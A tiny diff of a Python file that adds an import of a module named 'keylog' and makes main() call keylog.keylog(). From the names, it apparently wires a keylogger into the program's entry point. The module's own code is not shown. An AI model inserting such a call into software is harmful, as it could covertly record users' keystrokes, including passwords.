@@ -1,5 +1,8 @@
+import keylog
+
+
 def main():
-    pass
+    keylog.keylog()
     
 
 
